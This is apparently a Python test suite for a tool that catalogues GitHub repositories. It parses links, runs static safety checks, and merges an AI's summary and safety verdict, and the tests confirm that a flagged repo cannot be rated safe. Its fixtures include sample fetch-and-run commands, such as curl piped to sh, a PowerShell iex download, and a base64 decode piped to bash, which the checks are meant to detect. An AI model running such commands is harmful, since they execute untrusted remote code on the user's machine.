"""Pustaka repo: the link parser, the static safety reading, the AI's answer cleaned, and the worker loop."""

from datetime import UTC, datetime

from fakestore import FakeStore

from semasa import repo_library as rl

NOW = datetime(2026, 10, 23, 6, 0, tzinfo=UTC)
CATS = rl.DEFAULT_CATEGORIES


def test_parse_github_takes_the_shapes_wan_pastes():
    assert rl.parse_github("https://github.com/blixvip/MotionClone") == "blixvip/MotionClone"
    assert rl.parse_github("https://github.com/debpalash/VoiceStudio.git") == "debpalash/VoiceStudio"
    assert rl.parse_github("http://www.github.com/heygen-com/hyperframes/tree/main/skills?x=1#readme") == "heygen-com/hyperframes"
    assert rl.parse_github("https://gitlab.com/a/b") is None
    assert rl.parse_github("skills.sh") is None


def _info(**over):
    base = {"full_name": "a/b", "name": "b", "description": "", "html_url": "https://github.com/a/b", "default_branch": "main",
            "language": "Python", "languages": {"Python": 1}, "license": "MIT", "topics": [], "stars": 10, "forks": 1,
            "archived": False, "pushed_at": "2026-10-01T00:00:00Z", "last_sha": "abc", "files": [], "readme": "", "manifests": {},
            "workflows": []}
    base.update(over)
    return base


def test_static_checks_catch_a_pipe_to_shell_and_an_install_hook():
    info = _info(readme="Install:\n\n    curl -fsSL https://x.sh/install | sh\n",
                 manifests={"package.json": '{"scripts": {"postinstall": "node x.js"}}'})
    flags = rl.static_checks(info, NOW)
    assert {f["code"] for f in flags} == {"pipe_to_shell", "install_hook"}
    assert next(f for f in flags if f["code"] == "pipe_to_shell")["detail"] == "curl -fsSL https://x.sh/install | sh"
    assert rl.worst(flags) == "avoid"


def test_static_checks_name_no_licence_archived_and_stale():
    flags = rl.static_checks(_info(license="", archived=True, pushed_at="2023-01-01T00:00:00Z"), NOW)
    assert [f["code"] for f in flags] == ["no_license", "archived", "stale"] and rl.worst(flags) == "caution"
    assert rl.static_checks(_info(), NOW) == [] and rl.worst([]) == "unknown"


def test_static_checks_windows_iex_and_base64():
    iex = _info(readme="iex (New-Object Net.WebClient).DownloadString('http://x')")
    assert {f["code"] for f in rl.static_checks(iex, NOW)} == {"iex_download"}
    assert {f["code"] for f in rl.static_checks(_info(readme="echo aGVsbG8= | base64 -d | bash"), NOW)} == {"base64_to_shell"}


def test_clean_keeps_the_stricter_verdict_and_a_known_category():
    flags = [{"code": "pipe_to_shell", "severity": "avoid", "where": "README", "detail": "curl | sh"}]
    out = rl.clean({"summary_bm": "x", "summary_en": "y", "category": "motion", "tags": ["GSAP", " html "], "safety": "safe",
                    "safety_reasons": ["nothing of concern seen"]}, CATS, flags)
    assert out["safety"] == "avoid", "the AI cannot talk a flagged repo up to safe"
    assert out["category"] == "motion" and out["tags"] == ["gsap", "html"]
    assert out["safety_flags"][0]["code"] == "pipe_to_shell" and out["safety_flags"][-1]["where"] == "AI"
    # the AI may add concern
    assert rl.clean({"category": "nonsense", "safety": "caution"}, CATS, [])["safety"] == "caution"
    assert rl.clean({"category": "nonsense", "safety": "caution"}, CATS, [])["category"] == "lain"
    # nothing flagged and the AI says safe: safe. nothing flagged and the AI says nothing: safe too (a reading found nothing)
    assert rl.clean({"safety": "safe"}, CATS, [])["safety"] == "safe"
    assert rl.clean({}, CATS, [])["safety"] == "safe"


class FakeGH:
    def __init__(self, readme="# Hi\nnpm install\nnpm run render", files=None, manifests=None, missing=False):
        self.readme, self.missing = readme, missing
        self.files, self.manifests = files or ["README.md", "package.json"], manifests or {}
        self.calls = []

    def get(self, path, params=None, *, raw=False):
        self.calls.append(path)
        if self.missing:
            raise LookupError(f"404 {path}")
        if path.endswith("/readme"):
            return self.readme
        if "/git/trees/" in path:
            return {"tree": [{"path": f, "type": "blob", "size": 10} for f in self.files]}
        if "/contents/" in path:
            return self.manifests.get(path.rsplit("/", 1)[1], "")
        if path.endswith("/actions/workflows"):
            return {"workflows": [{"name": "CI"}]}
        if path.endswith("/languages"):
            return {"JavaScript": 100}
        if "/commits/" in path:
            return {"sha": "deadbeef1234567890"}
        return {"full_name": "a/b", "name": "b", "description": "motion graphics", "html_url": "https://github.com/a/b",
                "default_branch": "main", "language": "JavaScript", "license": {"spdx_id": "Apache-2.0"}, "topics": ["video"],
                "stargazers_count": 5, "forks_count": 0, "archived": False, "pushed_at": "2026-10-20T00:00:00Z"}

    def maybe(self, path, params=None, *, raw=False, default=None):
        try:
            return self.get(path, params, raw=raw)
        except LookupError:
            return default


class FakeLLM:
    last_model = "m1"

    def __init__(self, answer):
        self.answer, self.asked = answer, []

    def chat_json(self, system, user, **kw):
        self.asked.append((system, user))
        return self.answer


def _row(store, **over):
    row = {"url": "https://github.com/a/b", "status": "pending", "note": "", "category": "lain", "category_by": "bot",
           "attempts": 0, "created_at": "2026-10-23T05:00:00Z"}
    row.update(over)
    return store.table(rl.TABLE).insert(row).execute().data[0]


def test_run_reads_files_summarises_and_writes_done():
    store = FakeStore()
    r = _row(store, note="for motion videos")
    llm = FakeLLM({"summary_bm": "Alat motion.", "summary_en": "A motion tool.", "category": "motion", "tags": ["gsap"],
                    "use_for": "Semasa motion videos", "how_to_run": "npm install; npm run render", "safety": "safe",
                    "safety_reasons": ["nothing of concern seen"]})
    gh = FakeGH(manifests={"package.json": '{"name": "b"}'})
    counts = rl.run(store, gh, llm, NOW)
    assert counts == {"claimed": 1, "done": 1, "failed": 0, "requeued": 0}
    got = store.table(rl.TABLE).select("*").eq("id", r["id"]).execute().data[0]
    assert got["status"] == "done" and got["category"] == "motion" and got["safety"] == "safe" and got["model"] == "m1"
    assert got["full_name"] == "a/b" and got["license"] == "Apache-2.0" and got["last_sha"] == "deadbeef1234"
    assert got["summary_bm"] == "Alat motion." and got["readme_excerpt"].startswith("# Hi")
    system, user = llm.asked[0]
    assert "motion, video, suara" in system and "Wan's note when adding it: for motion videos" in user and '{"name": "b"}' in user
    assert store.tables["semasa_log"][-1]["area"] == "repos"


def test_wans_own_category_survives_a_reread():
    store = FakeStore()
    r = _row(store, category="regulatori", category_by="wan")
    rl.run(store, FakeGH(), FakeLLM({"category": "motion", "safety": "safe"}), NOW)
    assert store.table(rl.TABLE).select("*").eq("id", r["id"]).execute().data[0]["category"] == "regulatori"


def test_no_ai_still_lands_the_reading_with_the_rules_verdict():
    store = FakeStore()
    r = _row(store)
    rl.run(store, FakeGH(readme="curl https://x | sh"), None, NOW)
    got = store.table(rl.TABLE).select("*").eq("id", r["id"]).execute().data[0]
    assert got["status"] == "done" and got["safety"] == "avoid" and "static checks only" in got["error"]
    # an AI that answered nothing: same, with a different reason
    r2 = _row(store, url="https://github.com/a/c")
    rl.run(store, FakeGH(), FakeLLM(None), NOW)
    assert "AI gave no answer" in store.table(rl.TABLE).select("*").eq("id", r2["id"]).execute().data[0]["error"]


def test_a_404_is_an_error_at_once_and_a_bad_link_too():
    store = FakeStore()
    r = _row(store)
    rl.run(store, FakeGH(missing=True), FakeLLM({}), NOW)
    got = store.table(rl.TABLE).select("*").eq("id", r["id"]).execute().data[0]
    assert got["status"] == "error" and "404" in got["error"]
    r2 = _row(store, url="https://gitlab.com/x/y")
    rl.run(store, FakeGH(), FakeLLM({}), NOW)
    got2 = store.table(rl.TABLE).select("*").eq("id", r2["id"]).execute().data[0]
    assert got2["status"] == "pending" and "github.com" in got2["error"], "retried up to MAX_ATTEMPTS, then error"
    r3 = _row(store, url="https://gitlab.com/x/z", attempts=rl.MAX_ATTEMPTS - 1)
    rl.run(store, FakeGH(), FakeLLM({}), NOW)
    assert store.table(rl.TABLE).select("*").eq("id", r3["id"]).execute().data[0]["status"] == "error"


def test_recheck_requeues_a_repo_whose_head_moved():
    store = FakeStore()
    _row(store, status="done", last_sha="oldsha000000", default_branch="main")
    _row(store, url="https://github.com/a/c", status="done", last_sha="deadbeef1234", default_branch="main")
    gh = FakeGH()
    assert rl.requeue_moved(store, gh, NOW) == 1
    assert [r["status"] for r in store.tables[rl.TABLE]] == ["pending", "done"]
    counts = rl.run(store, gh, FakeLLM({"safety": "safe"}), NOW, recheck=True)
    assert counts["requeued"] == 0 and counts["done"] == 1


def test_load_settings_keeps_lain_last_and_defaults_when_empty():
    store = FakeStore()
    assert rl.load_settings(store)["categories"][-1] == "lain"
    store.tables["semasa_settings"] = [{"key": "repo_library", "value": {"categories": ["Motion", "voice"]}}]
    assert rl.load_settings(store)["categories"] == ["motion", "voice", "lain"]


def test_the_library_takes_every_kind_of_function_and_keeps_what_the_repo_can_do():
    # Wan, 26 Oct 2026: "the repo library only for style motion video, I want put all function repo"
    for cat in ("agen-ai", "mcp", "api", "dokumen", "keselamatan", "devops", "pemasaran", "pelayar"):
        assert cat in rl.DEFAULT_CATEGORIES
    assert rl.DEFAULT_CATEGORIES[-1] == "lain" and len(set(rl.DEFAULT_CATEGORIES)) == len(rl.DEFAULT_CATEGORIES)
    lines = [" Runs a RAG chat over PDFs ", "", "Exports answers"] + ["x"] * 10
    out = rl.clean({"category": "agen-ai", "safety": "safe", "functions": lines}, rl.DEFAULT_CATEGORIES, [])
    assert out["category"] == "agen-ai" and out["functions"][:2] == ["Runs a RAG chat over PDFs", "Exports answers"]
    assert len(out["functions"]) == 8, "at most eight lines"
    assert rl.clean({"category": "agen-ai"}, rl.DEFAULT_CATEGORIES, [])["functions"] == []
    assert "motion graphics" in rl.SYSTEM and "agen-ai" in rl.SYSTEM and "functions" in rl.SYSTEM
